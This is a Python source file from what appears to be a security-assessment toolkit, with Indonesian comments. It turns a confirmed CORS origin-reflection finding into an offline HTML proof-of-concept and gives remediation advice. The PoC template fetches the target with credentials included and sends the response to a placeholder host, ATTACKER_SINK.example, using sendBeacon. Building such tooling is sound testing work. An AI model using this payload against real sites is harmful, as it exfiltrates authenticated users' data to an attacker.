"""[SAFETY: read-only, NOL jaringan] cors_poc_gen — generator PoC-HTML CORS
dari temuan CORS yang SUDAH terkonfirmasi (CWE-942). TIDAK mengirim apa pun.

Konsep CORS misconfiguration (origin reflection + Allow-Credentials) — dibangun
FROM SCRATCH, stdlib murni, offline.

Ceruk vs modul lain (anti-duplikasi):
  - `skills/cors_checker.py` = deteksi LIVE (kirim Origin, baca header). Tool
    ini OFFLINE: mengubah temuan terkonfirmasi menjadi PoC-HTML yang bisa
    direproduksi; eksekusi di browser korban = next-step (LIVE), bukan di sini.

"Kejar sampai verdict": refleksi origin + Allow-Credentials:true => L1 LEAD
`lab_only` dengan PoC `fetch(credentials:'include')` lengkap (next-step =
host PoC, buka sebagai korban terautentikasi). Wildcard `*` + credentials =>
L0 (browser MEMBLOKIR kombinasi itu). ACAO terkunci ke origin tetap => L0.

Input -> mekanisme -> output:
  - Input : --url <endpoint>; --acao <nilai Access-Control-Allow-Origin yang
            teramati>; --acac (flag = Allow-Credentials:true); --origin
            <origin penyerang; default https://attacker.example>.
  - Output: JSON kontrak; --out; --fail-on. Exit 0/1/2.
"""
from __future__ import annotations

import argparse
import json
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "core"))
from findings import make_finding, write_findings  # noqa: E402

SCHEMA = "cyphron.cors-poc-gen/1"
TOOL = "cors-poc-gen"
SINK = "https://ATTACKER_SINK.example/collect"   # placeholder jinak


def _poc_html(url: str, with_creds: bool) -> str:
    cred = "include" if with_creds else "omit"
    return (
        "<!doctype html><html><body>\n"
        "<!-- secai CORS PoC (lab only). Benign: exfils to a placeholder sink. -->\n"
        "<script>\n"
        "fetch(%r, {credentials: %r})\n"
        "  .then(r => r.text())\n"
        "  .then(t => { navigator.sendBeacon(%r, t); })\n"
        "  .catch(e => console.log('cors blocked', e));\n"
        "</script></body></html>\n" % (url, cred, SINK)
    )


def analyze(url: str, acao: str, acac: bool, origin: str) -> dict:
    url = (url or "").strip()
    acao = (acao or "").strip()
    origin = (origin or "https://attacker.example").strip()
    if not url or not acao:
        raise ValueError("--url dan --acao wajib")
    findings: list[dict] = []
    reflected = acao == origin
    wildcard = acao == "*"
    param = "cors:%s" % url

    if wildcard and acac:
        findings.append(make_finding(
            tool=TOOL, title="CORS wildcard + credentials — not exploitable",
            severity="info", cwe="CWE-942",
            description=("ACAO '*' with Allow-Credentials:true is rejected by "
                         "browsers (credentials cannot be used with a wildcard "
                         "origin) — no credentialed cross-origin read."),
            recommendation="Still avoid '*'; scope ACAO to trusted origins.",
            target_url=url, param=param, status="confirmed", verdict=0,
            evidence_kind="", confidence=0.8, extra={"kind": "cors"}))
    elif reflected and acac:
        findings.append(make_finding(
            tool=TOOL,
            title="CORS origin reflection + credentials (exploitable)",
            severity="high", cwe="CWE-942",
            description=("ACAO reflects the attacker origin %r AND "
                         "Allow-Credentials:true — an attacker page can read "
                         "authenticated responses from %s. LEAD: confirmed by "
                         "hosting the PoC and visiting it as a logged-in victim."
                         % (origin, url)),
            recommendation=("Do not reflect arbitrary Origin; use a strict "
                            "allowlist; drop Allow-Credentials unless required."),
            target_url=url, param=param, status="unconfirmed", verdict=1,
            evidence_kind="payload", confidence=0.85, lab_only=True,
            poc=_poc_html(url, True), extra={"kind": "cors", "origin": origin}))
    elif reflected and not acac:
        findings.append(make_finding(
            tool=TOOL, title="CORS origin reflection without credentials",
            severity="low", cwe="CWE-942",
            description=("ACAO reflects %r but Allow-Credentials is not true — "
                         "only unauthenticated responses are cross-origin "
                         "readable. Matters only if %s returns sensitive data "
                         "without auth." % (origin, url)),
            recommendation="Scope ACAO to an allowlist even without credentials.",
            target_url=url, param=param, status="unconfirmed", verdict=1,
            evidence_kind="payload", confidence=0.6, lab_only=True,
            poc=_poc_html(url, False), extra={"kind": "cors", "origin": origin}))
    elif wildcard and not acac:
        findings.append(make_finding(
            tool=TOOL, title="CORS wildcard (no credentials)",
            severity="low", cwe="CWE-942",
            description=("ACAO '*' allows any origin to read unauthenticated "
                         "responses from %s." % url),
            recommendation="Scope ACAO to trusted origins.",
            target_url=url, param=param, status="unconfirmed", verdict=1,
            evidence_kind="payload", confidence=0.5, lab_only=True,
            poc=_poc_html(url, False), extra={"kind": "cors"}))
    else:
        findings.append(make_finding(
            tool=TOOL, title="CORS locked to a fixed origin — not exploitable",
            severity="info", cwe="CWE-942",
            description=("ACAO is %r (not '*' and not the attacker origin %r) — "
                         "the policy is pinned to a specific origin; no attacker-"
                         "controlled cross-origin read (checked, nothing found)."
                         % (acao, origin)),
            recommendation="Keep ACAO pinned to trusted origins.",
            target_url=url, param=param, status="confirmed", verdict=0,
            evidence_kind="", confidence=0.7, extra={"kind": "cors"}))

    stats = {"findings": len(findings),
             "by_severity": {f["severity"]: 1 for f in findings}}
    return {"schema": SCHEMA, "tool": TOOL, "stats": stats, "notes": [],
            "findings": findings}


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(
        description="Generate a CORS exploit PoC-HTML from a confirmed finding — offline.")
    ap.add_argument("--url", required=True)
    ap.add_argument("--acao", required=True, help="observed Access-Control-Allow-Origin")
    ap.add_argument("--acac", action="store_true", help="Allow-Credentials:true")
    ap.add_argument("--origin", default="https://attacker.example")
    ap.add_argument("--out")
    ap.add_argument("--fail-on", default="none",
                    choices=["none", "any", "high", "medium", "low"])
    args = ap.parse_args(argv)
    try:
        result = analyze(args.url, args.acao, args.acac, args.origin)
    except ValueError as exc:
        print("[cors-poc-gen] input error: %s" % exc, file=sys.stderr)
        return 2
    result["requests"] = 0
    if args.out:
        write_findings(args.out, result["findings"], meta={
            "schema": SCHEMA, "tool": TOOL, "stats": result["stats"],
            "notes": [], "requests": 0})
    print(json.dumps(result, ensure_ascii=False, indent=2, sort_keys=True))
    if args.fail_on == "none":
        return 0
    if args.fail_on == "any":
        return 1 if any(f["severity"] != "info" for f in result["findings"]) else 0
    need = {"high": {"critical", "high"},
            "medium": {"critical", "high", "medium"},
            "low": {"critical", "high", "medium", "low"}}[args.fail_on]
    return 1 if any(f["severity"] in need for f in result["findings"]) else 0


if __name__ == "__main__":
    sys.exit(main())
